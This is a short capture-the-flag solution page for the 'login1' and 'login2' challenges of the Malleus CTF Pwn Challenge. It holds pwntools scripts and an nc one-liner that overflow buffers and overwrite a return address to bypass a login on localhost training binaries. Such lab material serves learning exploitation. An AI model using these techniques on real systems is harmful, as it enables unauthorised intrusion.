# Malleus CTF Pwn Challenge

- https://github.com/kusano/ctfpwn_challenge
- https://sanya.sweetduet.info/ctfpwn/

## login1

```python
#!/usr/bin/env python3
from pwn import ELF, context, log, process, remote
exe = context.binary = ELF('./login1')
# io = process([exe.path])
io = remote('localhost', 10001)
io.sendline(b'A' * 0x2d)
io.sendline(b'password')
io.recvuntil(b'The flag is: ')
log.success(io.recvline().decode())
io.close()
```

## login2

```python
#!/usr/bin/env python3
from pwn import ELF, context, log, p64, process, remote
exe = context.binary = ELF('./login2')
# io = process([exe.path])
io = remote('localhost', 10002)
io.sendline(b'admin')
target_addr = 0x401352
io.sendline(b'A'*0x48 + p64(target_addr))
io.recvuntil(b'The flag is: ')
log.success(io.recvline().decode())
io.close()
```

```zsh
python3 -c "import sys;a=b'\x46\x13\x40\x00\x00\x00\x00\x00';sys.stdout.buffer.write((a*10+b'\x0a')*2)"|nc localhost 10002
```
